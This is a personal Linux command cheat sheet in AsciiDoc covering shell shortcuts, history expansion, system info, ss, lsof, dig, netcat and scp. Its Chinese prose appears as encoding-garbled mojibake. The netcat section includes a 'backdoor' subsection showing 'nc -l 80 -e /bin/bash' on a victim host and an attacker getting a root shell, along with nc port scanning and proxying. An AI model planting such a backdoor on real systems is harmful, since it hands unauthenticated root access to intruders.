= linuxÂ∏∏Áî®ÂëΩ‰ª§ËçâÈõÜ
:toc-title: ÁõÆÂΩï
:tip-caption: üí°
:note-caption: ‚ÑπÔ∏è
:important-caption: ‚ùó
:caution-caption: üî•
:warning-caption: ‚ö†Ô∏è
// :tip-caption: :bulb:
// :note-caption: :information_source:
// :important-caption: :heavy_exclamation_mark:	
// :caution-caption: :fire:
// :warning-caption: :warning:
:icons: font

Doc writer yaoyihao1@gmail.com

== ‰Ω†ÂèØËÉΩ‰∏çÁü•ÈÅìÁöÑ‰∏™‰∫∫Â∏∏Áî®ÂëΩ‰ª§

----
ctrl u ÂèØ‰ª•Âà†Èô§Ë°åÂÜÖÂÖâÊ†áÊâÄÂú®‰ΩçÁΩÆ‰πãÂâçÁöÑÂÜÖÂÆπ - Â∏∏Áî®
ctrl l ÂèØ‰ª•Ê∏ÖÂ±è - Â∏∏Áî®
ctrl a ÂèØ‰ª•Â∞ÜÂÖâÊ†áÁßªËá≥Ë°åÈ¶ñ
ctrl e ÂèØ‰ª•Â∞ÜÂÖâÊ†áÁßªËá≥Ë°åÂ∞æ
ctrl k ÂèØ‰ª•Âà†Èô§ÂÖâÊ†áËá≥Ë°åÂ∞æÁöÑÊâÄÊúâÂÜÖÂÆπ
ctrl w Âà†Èô§‰Ω†ÈîÆÂÖ•ÁöÑÊúÄÂêé‰∏Ä‰∏™ÂçïËØç

cd - ÂõûÂà∞Ââç‰∏Ä‰∏™Â∑•‰ΩúË∑ØÂæÑ
----

== ÁâπÊÆäÁ¨¶Âè∑ÁöÑÂ∫îÁî®

=== ! -d

> Ê£ÄÊü•Êüê‰∏™ÁõÆÂΩïÊòØÂê¶Â≠òÂú®

----
Âíå‰∏äÈù¢ÁöÑÂëΩ‰ª§Á±ª‰ºº„ÄÇËøôÈáåÊòØÊ£ÄÊµãÁõÆÂΩïÊòØÂê¶‰∏∫Á©∫ÔºåÂ¶ÇÊûú‰∏∫Á©∫ÂàôÈÄÄÂá∫ÂëΩ‰ª§
skyler@bogon  ~/skyler/a [ ! -d /home/test/exist ] && exit
Ê£ÄÊµãÁõÆÂΩïÊòØÂê¶‰∏∫Á©∫ÔºåÂ¶ÇÊûú‰∏∫Á©∫ÂàôÂàõÂª∫ËØ•ÁõÆÂΩï
skyler@bogon  ~/skyler/a [ ! -d /home/test/exist ] && mkdir /home/test/exist

----

=== !$ 

> Â∞Ü‰∏ä‰∏ÄÊù°ÂëΩ‰ª§ÁöÑÂèÇÊï∞‰º†ÈÄíÁªô‰∏ã‰∏ÄÊù°ÂëΩ‰ª§ÂèÇÊï∞

ÂΩìËøô‰∏™ÂèÇÊï∞ÁâπÂà´ÈïøÁöÑÊó∂ÂÄôÊ≠§ÂëΩ‰ª§ÁâπÂà´ÊúâÁî®

----
skyler@bogon  ~/skyler/a 201910  cd /Users/skyler/skyler/a
skyler@bogon  ~/skyler/a 201910  ll !$
skyler@bogon  ~/skyler/a 201910  ll /Users/skyler/skyler/a
total 64
-rw-r--r--  1 skyler  staff   346B  8  8 11:55 Dockerfile
-rw-r--r--  1 skyler  staff   249B  8  9 14:16 README.md
----

===  !!

> ÊâßË°å‰∏ä‰∏ÄÊù°ÂëΩ‰ª§

----
[root@aizbp11lqlgyf2g31fgs4hg ~]# cat test.sh
echo $# $0 $1
aaa=111
[root@aizbp11lqlgyf2g31fgs4hg ~]# !!
cat test.sh
echo $# $0 $1
aaa=111
----


=== ‰ªéÂéÜÂè≤ËÆ∞ÂΩï‰∏≠‰ΩøÁî®ÂëΩ‰ª§Âè∑Êù•ËøêË°åÂëΩ‰ª§

È¶ñÂÖàËæìÂÖ• **history** ÂëΩ‰ª§ÂæóÂà∞ÂëΩ‰ª§ÁöÑÂ∫èÂè∑

----
skyler@bogon  ~/bin history
10063* [ ! d ~/test/exist ] && echo "no"
10064* [ diff ~/test/exist ] && echo "no"
10065* [ ! -d ~/test/exist ] && echo "no"
10066* [ ! -d ~/bin ] && echo "no"
----

ÁÑ∂ÂêéÈÄöËøáÊØèË°åÂâçÁöÑÂ∫èÂè∑ÁªìÂêà!Êù•ÊâßË°åÊ≠§Ë°åÂëΩ‰ª§

----
skyler@bogon  ~/bin  !10065
skyler@bogon  ~/bin  [ ! -d ~/test/exist ] && echo "no"
----

ËøòÂèØ‰ª•‰ΩøÁî®!-n, n‰∏∫Êï∞Â≠ó

----
skyler@bogon  ~/bin  !-2
skyler@bogon  ~/bin  [ ! -d ~/test/exist ] && echo "no"
----



== Á≥ªÁªü‰ø°ÊÅØ

----
cat /proc
uname
----

=== cat /proc Á≥ªÁªü‰ø°ÊÅØ

----
cat /proc/{xxx}
----

=== uname

----
[root@aizbp11lqlgyf2g31fgs4hg ~]# uname -a
Linux aizbp11lqlgyf2g31fgs4hg 3.10.0-693.2.2.el7.x86_64 #1 SMP Tue Sep 12 22:26:13 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

Êü•Áúã‰∏ªÊú∫Âêç
[root@aizbp11lqlgyf2g31fgs4hg ~]# uname -n
aizbp11lqlgyf2g31fgs4hg

Êü•ÁúãlinuxÂèëË°åÁâàÂèäÁâàÊú¨Âè∑
ÊñπÊ≥ï‰∏Ä
[root@aizbp11lqlgyf2g31fgs4hg /]# cat /etc/redhat-release
CentOS Linux release 7.4.1708 (Core)

ÊñπÊ≥ï‰∫å
[root@aizbp11lqlgyf2g31fgs4hg /]# cat /etc/os-release
NAME="CentOS Linux"
VERSION="7 (Core)"
ID="centos"
ID_LIKE="rhel fedora"
VERSION_ID="7"
PRETTY_NAME="CentOS Linux 7 (Core)"
ANSI_COLOR="0;31"
CPE_NAME="cpe:/o:centos:centos:7"
HOME_URL="https://www.centos.org/"
BUG_REPORT_URL="https://bugs.centos.org/"

CENTOS_MANTISBT_PROJECT="CentOS-7"
CENTOS_MANTISBT_PROJECT_VERSION="7"
REDHAT_SUPPORT_PRODUCT="centos"
REDHAT_SUPPORT_PRODUCT_VERSION="7"

ÊñπÊ≥ï‰∏â
[root@aizbp11lqlgyf2g31fgs4hg /]# lsb_release  -a
LSB Version:	:core-4.1-amd64:core-4.1-noarch
Distributor ID:	CentOS
Description:	CentOS Linux release 7.4.1708 (Core)
Release:	7.4.1708
Codename:	Core
----


== ÁΩëÁªú

=== ÁΩëÁªúËøûÊé•(ËøõÁ®ãÁ´ØÂè£)

----
ssÔºöÊü•ÁúãÁΩëÁªúËøûÊé•
lsofÔºöÊü•ÁúãÁΩëÁªúËøûÊé•
----

==== ss - socket statistics

Êü•ÁúãÁΩëÁªúËøûÊé•Ôºå‰ª£ÊõønetstatÂëΩ‰ª§Ôºå‰ΩøÁî®Êõ¥ÁÆÄÊ¥Å„ÄÇ

ÂèØ‰ª•Êü•ÁúãpidÂíåÊúçÂä°Á´ØÂè£ÁöÑÂØπÂ∫îÂÖ≥Á≥ª

----
[root@aizbp11lqlgyf2g31fgs4hg ~]# ss -ptl
State      Recv-Q Send-Q                                                                                         Local Address:Port                                                                                                          Peer Address:Port
LISTEN     0      128                                                                                                   *:ssh                                                                                                                      *:*                     users:(("sshd",pid=1329,fd=3))
LISTEN     0      1                                                                                                  127.0.0.1:32000                                                                                                                    *:*                     users:(("java",pid=17595,fd=3))
LISTEN     0      128                                                                                                       :::lanmessenger                                                                                                            :::*                     users:(("docker-proxy-cu",pid=2937,fd=4))
[root@aizbp11lqlgyf2g31fgs4hg ~]#
----

----
[root@aizbp11lqlgyf2g31fgs4hg ~]# ss -ptln|grep 20282
LISTEN     0      100          *:20282                    *:*                   users:(("java",pid=17470,fd=21))
----

> `ss` ÁúüÊ≠£ËÄÄÁúºÁöÑÂú∞ÊñπÊòØÂÖ∂ÂÜÖÁΩÆÁöÑËøáÊª§ËÉΩÂäõ

Âè™ÊÉ≥ÁúãÂ∑≤Âª∫Á´ãÁöÑ socketÔºàÊéíÈô§‰∫Ü *listening* Âíå *closed* Ôºâ

----
$ ss state connected sport = :ssh
Netid State      Recv-Q Send-Q     Local Address:Port                      Peer Address:Port
tcp   ESTAB      0      0          192.168.0.136:ssh                      192.168.0.102:46540
----

ÂàóÂá∫ÊåáÂÆöÁöÑ host ÊàñËÄÖ ip ÊÆµ„ÄÇ‰æãÂ¶ÇÔºåÂàóÂá∫Âà∞Ëææ 74.125.0.0/16 Â≠êÁΩëÁöÑËøûÊé•ÔºåËøô‰∏™Â≠êÁΩëÂ±û‰∫é Google

----
$ ss state all dst 74.125.0.0/16
Netid State      Recv-Q Send-Q     Local Address:Port                      Peer Address:Port
tcp   ESTAB      0      0          192.168.0.136:33616                   74.125.142.189:https
tcp   ESTAB      0      0          192.168.0.136:42034                    74.125.70.189:https
tcp   ESTAB      0      0          192.168.0.136:57408                   74.125.202.189:https
----

==== lsof - list open files

> ÈùûÂ∏∏ÂÆûÁî®ÁöÑÁ≥ªÁªüÁ∫ßÁöÑÁõëÊéß„ÄÅËØäÊñ≠Â∑•ÂÖ∑

----
Êü•ÁúãÊåáÂÆöÁ´ØÂè£ÊúâÂì™‰∫õËøõÁ®ãÂú®‰ΩøÁî® lsof -i:PORTÔºàlsof -i ÂàóÂá∫ÊâÄÊúâÁöÑÊâìÂºÄÁöÑÁΩëÁªúËøûÊé•Ôºâ 
[root@aizbp11lqlgyf2g31fgs4hg ~]# lsof -i:32000
COMMAND   PID USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME
wrapper  1105 root    6u  IPv4 53752676      0t0  TCP localhost:32000->localhost:31001 (ESTABLISHED)
java    17595 root    3u  IPv4 53752648      0t0  TCP localhost:32000 (LISTEN)
java    17595 root   28u  IPv4 53752674      0t0  TCP localhost:31001->localhost:32000 (ESTABLISHED)

Êü•ÁúãÊåáÂÆöËøõÁ®ãpidÊâìÂºÄÁöÑÊñá‰ª∂ losf -p pid
[root@aizbp11lqlgyf2g31fgs4hg ~]# lsof -p 17595
COMMAND   PID USER   FD   TYPE             DEVICE  SIZE/OFF     NODE NAME
java    17595 root  mem    REG              253,1   1078737  1313486 /usr/local/cloudmonitor/lib/spring-core-4.2.4.RELEASE.jar
java    17595 root  mem    REG              253,1   1097552  1313482 /usr/local/cloudmonitor/lib/spring-context-4.2.4.RELEASE.jar
java    17595 root  mem    REG              253,1    731512  1313485 /usr/local/cloudmonitor/lib/spring-beans-4.2.4.RELEASE.jar

ÂàóÂá∫Ë¢´Êüê‰∏™ËøõÁ®ãÊâìÂºÄÊâÄÊúâÁöÑÁΩëÁªúÊñá‰ª∂
lsof -i -a -p 234

Êü•ÁúãÊåáÂÆö‰∏ªÊú∫ÊúâÂì™‰∫õËøõÁ®ãÂú®‰ΩøÁî®
lsof -i@192.168.1.91

Êü•ÁúãÊåáÂÆöÁî®Êà∂ÊâìÂºÄÁöÑÊñá‰ª∂
lsof -u messagebus

Êü•ÁúãÊåáÂÆöÁ®ãÂ∫èÊâìÂºÄÁöÑÊñá‰ª∂
lsof -c firefox

Êü•ÁúãË¢´Âà†Èô§ÁöÑÊñá‰ª∂„ÄÇÊúâ‰∫õÂà†‰∫ÜÁöÑÊñá‰ª∂Ôºå‰ΩÜÊòØËøõÁ®ãÊ≤°reloadÔºåÈÇ£‰∫õÁ©∫Èó¥ËøòÊòØÂç†Áî®ÁöÑ
lsof|grep -i delete
----



=== ÁΩëÁªúÁÆ°ÁêÜ

----
ipÔºö
ifconfigÔºö
digÔºö
----

==== ip - show / manipulate routing, devices, policy routing and tunnels

> ip ÊÑèÂú®Âèñ‰ª£ifconfig

----
[root@aizbp11lqlgyf2g31fgsfhg ~]# ip addr|grep eth0
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    inet 172.16.68.43/20 brd 172.16.79.255 scope global dynamic eth0
----

==== ifconfig - configure a network interface

----
[root@aizbp11lqlgyf2g31fgsfhg /]# ifconfig |grep inet
        inet 172.20.0.1  netmask 255.255.0.0  broadcast 172.20.255.255
        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet 172.16.68.43  netmask 255.255.240.0  broadcast 172.16.79.255
        inet 127.0.0.1  netmask 255.0.0.0
----

==== dig - DNS lookup utility

> DNSÊü•ÊâæÂ∑•ÂÖ∑

----
dig ‰ªéDNSÂüüÂêçÊúçÂä°Âô®Êü•ËØ¢ÊåáÂÆö‰∏ªÊú∫‰ø°ÊÅØ
dig baidu.com

‰ªéÊåáÂÆöÁöÑ DNS ÊúçÂä°Âô®‰∏äÊü•ËØ¢
dig @8.8.8.8 abc.filterinto.com

Ë∑üË∏™Êï¥‰∏™Êü•ËØ¢ËøáÁ®ã
Â¶ÇÊûú‰Ω†Â•ΩÂ•á dig ÂëΩ‰ª§ÊâßË°åÊü•ËØ¢Êó∂ÈÉΩÁªèÂéÜ‰∫ÜÂì™‰∫õËøáÁ®ãÔºå‰Ω†ÂèØ‰ª•Â∞ùËØï‰ΩøÁî® +trace ÈÄâÈ°π„ÄÇÂÆÉ‰ºöËæìÂá∫‰ªéÊ†πÂüüÂà∞ÊúÄÁªàÁªìÊûúÁöÑÊâÄÊúâ‰ø°ÊÅØÔºö
$ dig +trace abc.filterinto.com
----



=== ÁΩëÁªúË∞ÉËØï(ÁΩëÁªúËØäÊñ≠)

----
wiresharkÔºö
ncÔºö
mtrÔºö
----



==== wireshark

> Âº∫Â§ßÁöÑÂèØËßÜÂåñÂ∑•ÂÖ∑ ‰∏ÄÂÆöË¶Å‰ºöÁî® todo

----
wireshark
----



==== nc - netcat - Concatenate and redirect sockets

> Êó¢ÂèØ‰ª•ÁΩëÁªúË∞ÉËØïÂèàÊï∞ÊçÆ‰º†Ëæì, Êó¢ÊòØ‰∏Ä‰∏™Á´ØÂè£Êâ´ÊèèÂ∑•ÂÖ∑Ôºå‰πüÊòØ‰∏ÄÊ¨æÂÆâÂÖ®Â∑•ÂÖ∑ÔºåËøòËÉΩÊòØ‰∏ÄÊ¨æÁõëÊµãÂ∑•ÂÖ∑ÔºåÁîöËá≥ÂèØ‰ª•ÂÅö‰∏∫‰∏Ä‰∏™ÁÆÄÂçïÁöÑ TCP ‰ª£ÁêÜ„ÄÇ Áî±‰∫éÊúâËøô‰πàÂ§öÁöÑÂäüËÉΩÔºåÂÆÉË¢´Ë™â‰∏∫ÊòØÁΩëÁªúÁïåÁöÑÁëûÂ£´ÂÜõÂàÄ
>

===== ÁΩëÁªúË∞ÉËØï

----
todo
----

===== Êï∞ÊçÆ‰º†Ëæì

‰ΩøÁî®netcatÂÆûÁé∞ËÅäÂ§©

----
47.98.189.37Êú∫Âô®ÔºåÁõëÂê¨80Á´ØÂè£(Ê≥®ÊÑè:ÊàëËøôÈáåÊòØaliyunÊúçÂä°Âô®Ôºå‰ªñÁöÑÂÆâÂÖ®Á≠ñÁï•ÊòØÂè™ÂºÄÊîæ‰∫Ü80Á≠âÁ´ØÂè£Ôºå‰Ω†‰ΩøÁî®ÂÖ∂‰ªñÁ´ØÂè£ÂèØËÉΩÊó†Ê≥ïÂÆûÁé∞ËÅäÂ§©ÔºåËøôÊòØÂõ†‰∏∫ÈòøÈáå‰∫ëÁöÑÂÆâÂÖ®Á≠ñÁï•ÊéßÂà∂ÁöÑÔºå‰Ω†ÈúÄË¶ÅÈÖçÁΩÆ‰Ω†‰ΩøÁî®ÁöÑÁ´ØÂè£)
Êé•Êî∂Á´ØÂêØÂä®ÁõëÂê¨
[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -l 80
ff
dfgdfg

ÂèëÈÄÅÁ´Ø(macÊú∫Âô®)ËøûÊé•47.98.189.37Êú∫Âô®ÁöÑ80Á´ØÂè£
[skyler@mac ~]# nc 47.98.189.37 80
ff
dfgdfg

ËæìÂÖ•ff„ÄÅdfgdfgÂèØ‰ª•ÁúãÂà∞Ê∂àÊÅØÂ∑≤ÁªèÁõ∏‰∫í‰º†ÈÄí‰∫Ü„ÄÇÊñ≠ÂºÄÊó∂ÈúÄË¶ÅÊâãÂä®Ctrl + c
----

‰ΩøÁî®netcatÂÆûÁé∞Êñá‰ª∂‰º†Ëæì
----
[root@izbp10lqlgy2g31s41bt94z ~]# nc -l 80 > test.sh
[root@izbp10lqlgy2g31s41bt94z ~]# ll
-rw-r--r-- 1 root root     0 10Êúà 29 10:37 test.sh

[skyler@mac ~]# nc 47.98.189.37 80 < test.sh
‰º†ËæìÂÆåÊàêÔºåËøûÊé•Ëá™Âä®Êñ≠ÂºÄ
----

===== Á´ØÂè£Êâ´ÊèèÂ∑•ÂÖ∑

----
ÂÆû‰æãÔºönc -v -z -w2 192.168.31.164 1-100

-vÔºöÊòæÁ§∫Êåá‰ª§ÊâßË°åËøáÁ®ãÔºõ
-zÔºö‰ΩøÁî®0ËæìÂÖ•/ËæìÂá∫Ê®°ÂºèÔºåÂè™Âú®Êâ´ÊèèÈÄö‰ø°Á´ØÂè£Êó∂‰ΩøÁî®„ÄÇ
-w2ÔºöËÆæÁΩÆÁ≠âÂæÖËøûÁ∫øÁöÑÊó∂Èó¥‰∏∫2sÔºõ
[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -v -z -w2 192.168.31.164 38322
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Connection timed out.
----

===== ÂÆâÂÖ®Â∑•ÂÖ∑
----
1. Á´ØÂè£ËΩ¨ÂèëÔºå‰Ωú‰∏∫‰ª£ÁêÜÔºå
2. ÂàõÂª∫ÂêéÈó®(‰πüÂè´ÂèçÂºπshell)
----

=====# Á´ØÂè£ËΩ¨ÂèëÔºå‰Ωú‰∏∫‰ª£ÁêÜ
----
Á´ØÂè£ËΩ¨Âèë
Êàë‰ª¨ÈÄöËøáÈÄâÈ°π -c Êù•Áî® nc ËøõË°åÁ´ØÂè£ËΩ¨ÂèëÔºåÂÆûÁé∞Á´ØÂè£ËΩ¨ÂèëÁöÑËØ≠Ê≥ï‰∏∫Ôºö
[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -u -l  80 -c  'ncat -u -l 8080'

‰Ωú‰∏∫‰ª£ÁêÜ
[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -l 8080 | nc 192.168.1.200 80
ÊâÄÊúâÂèëÂæÄÊàë‰ª¨ÊúçÂä°Âô® 8080 Á´ØÂè£ÁöÑËøûÊé•ÈÉΩ‰ºöËá™Âä®ËΩ¨ÂèëÂà∞ 192.168.1.200 ‰∏äÁöÑ 80 Á´ØÂè£„ÄÇ ‰∏çËøáÁî±‰∫éÊàë‰ª¨‰ΩøÁî®‰∫ÜÁÆ°ÈÅìÔºåÊï∞ÊçÆÂè™ËÉΩË¢´ÂçïÂêë‰º†Ëæì„ÄÇË¶ÅÂêåÊó∂ËÉΩÂ§üÊé•ÂèóËøîÂõûÁöÑÊï∞ÊçÆÔºåÊàë‰ª¨ÈúÄË¶ÅÂàõÂª∫‰∏Ä‰∏™ÂèåÂêëÁÆ°ÈÅì„ÄÇ ‰ΩøÁî®‰∏ãÈù¢ÂëΩ‰ª§ÂèØ‰ª•ÂÅöÂà∞ËøôÁÇπ:

[root@aizbp11lqlgyf2g31fgsfhg ~]# mkfifo 2way
[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -l 8080 0<2way | nc 192.168.1.200 80 1>2way
Áé∞Âú®‰Ω†ÂèØ‰ª•ÈÄöËøá nc ‰ª£ÁêÜÊù•Êî∂ÂèëÊï∞ÊçÆ‰∫Ü„ÄÇ
----

====== ÂàõÂª∫ÂêéÈó®(‰πüÂè´ÂèçÂºπshell)
----
ÂèóÂÆ≥ËÄÖÊú∫Âô®‰∏ªÂä®ÊâìÂºÄÁõëÂê¨„ÄÇ-e‰∏∫ÊâßË°åË¢´ÁªôÁöÑÂëΩ‰ª§Ôºå‚Äúnc -l 80 -e /bin/bash‚ÄùÂê´‰πâ‰∏∫ÊâßË°åËøûÊé•Á´ØËæìÂÖ•ÁöÑÂëΩ‰ª§
[root@izbp10lqlgy2g31s41bt94z ~]# nc -l 80 -e /bin/bash

ÊîªÂáªÁ´Ø(ËøûÊé•Á´Ø)ËøûÊé•ÂèóÂÆ≥ËÄÖÊú∫Âô®80Á´ØÂè£ÔºåÁÑ∂ÂêéËæìÂÖ•ÂëΩ‰ª§Ëé∑ÂèñÂèóÂÆ≥ËÄÖÊú∫Âô®ÁöÑ‰ø°ÊÅØÔºå‰ªéËÄåÂÆûÁé∞ÊîªÂáª
[skyler@mac ~]# nc 47.98.189.37 80
w
 11:21:25 up 493 days, 23:11,  1 user,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/0    210.12.157.87    10:13   13.00s  0.04s  0.00s w
whoami
root
uname -a
Linux izbp10lqlgy2g31s41bt94z 3.10.0-693.2.2.el7.x86_64 #1 SMP Tue Sep 12 22:26:13 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
----

===== ÁõëÊµãÂ∑•ÂÖ∑
----
ÂêØÂä®ÁõëÂê¨„ÄÇÁ≠âÂæÖËøûÊé•Á´ØËøûÊé•
[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -l 80
----



==== mtr - a network diagnostic tool

ÊòØ‰∏ÄÊ¨æÊõ¥Â•ΩÁöÑÁΩëÁªúËØäÊñ≠„ÄÅÁΩëÁªúË∞ÉËØïË∑üË∏™Â∑•ÂÖ∑ÔºåÈõÜÊàê‰∫Ütraceroute„ÄÅping„ÄÅnslookupÁöÑÂà§Êñ≠‰∏ªÊú∫ÁöÑÁΩëÁªúËøûÈÄöÊÄßÂäüËÉΩÔºåÁî®‰∫éËØäÊñ≠ÁΩëÁªúÁä∂ÊÄÅÈùûÂ∏∏ÊúâÁî®

----
[root@aizbp11lqlgyf2g31fgsfhg ~]# mtr www.baidu.com
----

image::linuxÂëΩ‰ª§Ê∏©ÊïÖÁü•Êñ∞/image-20191019225352819.png[image-20191019225352819]

http://einverne.github.io/post/2017/11/mtr-usage.html



=== ÁΩëÁªúÂ∏¶ÂÆΩ

----
nethogs: ÊåâËøõÁ®ãÊü•ÁúãÊµÅÈáèÂç†Áî®
iptraf: ÊåâËøûÊé•/Á´ØÂè£Êü•ÁúãÊµÅÈáè
ifstat: ÊåâËÆæÂ§áÊü•ÁúãÊµÅÈáè
iftop: ÊåâÂ•óÊé•Â≠óÁúãËøûÊé•Â∏¶ÂÆΩÊµÅÈáèÂç†Áî®
ethtool: ËØäÊñ≠Â∑•ÂÖ∑
tcpdump: ÊäìÂåÖÂ∑•ÂÖ∑
ss: ËøûÊé•Êü•ÁúãÂ∑•ÂÖ∑
----



=== ÁΩëÁªú‰º†Ëæì(Êï∞ÊçÆ)

----
scpÔºö‰∏çÂêåÊú∫Âô®‰∏äËøúÁ®ãÊã∑Ë¥ùÊñá‰ª∂
ncÔºöÊï∞ÊçÆ‰º†Ëæì
----

==== scp - secure copy

----
scpÊòØsecure copyÁöÑÁÆÄÂÜôÔºåÁî®‰∫éÂú®Linux‰∏ãËøõË°åËøúÁ®ãÊã∑Ë¥ùÊñá‰ª∂ÁöÑÂëΩ‰ª§ÔºåÂíåÂÆÉÁ±ª‰ººÁöÑÂëΩ‰ª§ÊúâcpÔºå‰∏çËøácpÂè™ÊòØÂú®Êú¨Êú∫ËøõË°åÊã∑Ë¥ù‰∏çËÉΩË∑®ÊúçÂä°Âô®ÔºåËÄå‰∏îscp‰º†ËæìÊòØÂä†ÂØÜÁöÑ„ÄÇ
ÂèØËÉΩ‰ºöÁ®çÂæÆÂΩ±Âìç‰∏Ä‰∏ãÈÄüÂ∫¶„ÄÇÂΩì‰Ω†ÊúçÂä°Âô®Á°¨ÁõòÂèò‰∏∫Âè™ËØª read only systemÊó∂ÔºåÁî®scpÂèØ‰ª•Â∏Æ‰Ω†ÊääÊñá‰ª∂ÁßªÂá∫Êù•„ÄÇ
Âè¶Â§ñÔºåscpËøòÈùûÂ∏∏‰∏çÂç†ËµÑÊ∫êÔºå‰∏ç‰ºöÊèêÈ´òÂ§öÂ∞ëÁ≥ªÁªüË¥üËç∑ÔºåÂú®Ëøô‰∏ÄÁÇπ‰∏äÔºårsyncÂ∞±ËøúËøú‰∏çÂèäÂÆÉ‰∫Ü„ÄÇ
ËôΩÁÑ∂ rsyncÊØîscp‰ºöÂø´‰∏ÄÁÇπÔºå‰ΩÜÂΩìÂ∞èÊñá‰ª∂‰ºóÂ§öÁöÑÊÉÖÂÜµ‰∏ãÔºårsync‰ºöÂØºËá¥Á°¨ÁõòI/OÈùûÂ∏∏È´òÔºåËÄåscpÂü∫Êú¨‰∏çÂΩ±ÂìçÁ≥ªÁªüÊ≠£Â∏∏‰ΩøÁî®
----

===== ÂëΩ‰ª§Ê†ºÂºè

> scp [ÂèÇÊï∞] [ÂéüË∑ØÂæÑ] [ÁõÆÊ†áË∑ØÂæÑ]

===== ÂëΩ‰ª§ÂäüËÉΩ

scpÊòØ secure copyÁöÑÁº©ÂÜô, scpÊòØlinuxÁ≥ªÁªü‰∏ãÂü∫‰∫ésshÁôªÈôÜËøõË°åÂÆâÂÖ®ÁöÑËøúÁ®ãÊñá‰ª∂Êã∑Ë¥ùÂëΩ‰ª§„ÄÇlinuxÁöÑscpÂëΩ‰ª§ÂèØ‰ª•Âú®linuxÊúçÂä°Âô®‰πãÈó¥Â§çÂà∂Êñá‰ª∂ÂíåÁõÆÂΩï„ÄÇ

===== ÂëΩ‰ª§ÂèÇÊï∞

----
-1 Âº∫Âà∂scpÂëΩ‰ª§‰ΩøÁî®ÂçèËÆÆssh1 
-2 Âº∫Âà∂scpÂëΩ‰ª§‰ΩøÁî®ÂçèËÆÆssh2 
-4 Âº∫Âà∂scpÂëΩ‰ª§Âè™‰ΩøÁî®IPv4ÂØªÂùÄ 
-6 Âº∫Âà∂scpÂëΩ‰ª§Âè™‰ΩøÁî®IPv6ÂØªÂùÄ 
-B ‰ΩøÁî®ÊâπÂ§ÑÁêÜÊ®°ÂºèÔºà‰º†ËæìËøáÁ®ã‰∏≠‰∏çËØ¢ÈóÆ‰º†ËæìÂè£‰ª§ÊàñÁü≠ËØ≠Ôºâ 
-C ÂÖÅËÆ∏ÂéãÁº©„ÄÇÔºàÂ∞Ü-CÊ†áÂøó‰º†ÈÄíÁªôsshÔºå‰ªéËÄåÊâìÂºÄÂéãÁº©ÂäüËÉΩÔºâ 
-p ‰øùÁïôÂéüÊñá‰ª∂ÁöÑ‰øÆÊîπÊó∂Èó¥ÔºåËÆøÈóÆÊó∂Èó¥ÂíåËÆøÈóÆÊùÉÈôê„ÄÇ 
-q ‰∏çÊòæÁ§∫‰º†ËæìËøõÂ∫¶Êù°„ÄÇ 
-r ÈÄíÂΩíÂ§çÂà∂Êï¥‰∏™ÁõÆÂΩï„ÄÇ 
-v ËØ¶ÁªÜÊñπÂºèÊòæÁ§∫ËæìÂá∫„ÄÇscpÂíåssh(1)‰ºöÊòæÁ§∫Âá∫Êï¥‰∏™ËøáÁ®ãÁöÑË∞ÉËØï‰ø°ÊÅØ„ÄÇËøô‰∫õ‰ø°ÊÅØÁî®‰∫éË∞ÉËØïËøûÊé•ÔºåÈ™åËØÅÂíåÈÖçÁΩÆÈóÆÈ¢ò„ÄÇ 
-c cipher ‰ª•cipherÂ∞ÜÊï∞ÊçÆ‰º†ËæìËøõË°åÂä†ÂØÜÔºåËøô‰∏™ÈÄâÈ°πÂ∞ÜÁõ¥Êé•‰º†ÈÄíÁªôssh„ÄÇ 
-F ssh_config ÊåáÂÆö‰∏Ä‰∏™Êõø‰ª£ÁöÑsshÈÖçÁΩÆÊñá‰ª∂ÔºåÊ≠§ÂèÇÊï∞Áõ¥Êé•‰º†ÈÄíÁªôssh„ÄÇ 
-i identity_file ‰ªéÊåáÂÆöÊñá‰ª∂‰∏≠ËØªÂèñ‰º†ËæìÊó∂‰ΩøÁî®ÁöÑÂØÜÈí•Êñá‰ª∂ÔºåÊ≠§ÂèÇÊï∞Áõ¥Êé•‰º†ÈÄíÁªôssh„ÄÇ  
-l limit ÈôêÂÆöÁî®Êà∑ÊâÄËÉΩ‰ΩøÁî®ÁöÑÂ∏¶ÂÆΩÔºå‰ª•Kbit/s‰∏∫Âçï‰Ωç„ÄÇ  
-o ssh_option Â¶ÇÊûú‰π†ÊÉØ‰∫é‰ΩøÁî®ssh_config(5)‰∏≠ÁöÑÂèÇÊï∞‰º†ÈÄíÊñπÂºèÔºå 
-P port Ê≥®ÊÑèÊòØÂ§ßÂÜôÁöÑP, portÊòØÊåáÂÆöÊï∞ÊçÆ‰º†ËæìÁî®Âà∞ÁöÑÁ´ØÂè£Âè∑ 
-S program ÊåáÂÆöÂä†ÂØÜ‰º†ËæìÊó∂ÊâÄ‰ΩøÁî®ÁöÑÁ®ãÂ∫è„ÄÇÊ≠§Á®ãÂ∫èÂøÖÈ°ªËÉΩÂ§üÁêÜËß£ssh(1)ÁöÑÈÄâÈ°π„ÄÇ
----



===== ‰ΩøÁî®ÂÆû‰æã

===== ‰ªéÊú¨Âú∞ÊúçÂä°Âô®‰∏ä‰º†Âà∞ËøúÁ®ãÊúçÂä°Âô®

----
(1) ‰∏ä‰º†Êñá‰ª∂
ÂëΩ‰ª§Ê†ºÂºèÔºö 
scp local_file remote_username@remote_ip:remote_folder 
ÊàñËÄÖ 
scp local_file remote_username@remote_ip:remote_file 
ÊàñËÄÖ 
scp local_file remote_ip:remote_folder 
ÊàñËÄÖ 
scp local_file remote_ip:remote_file 

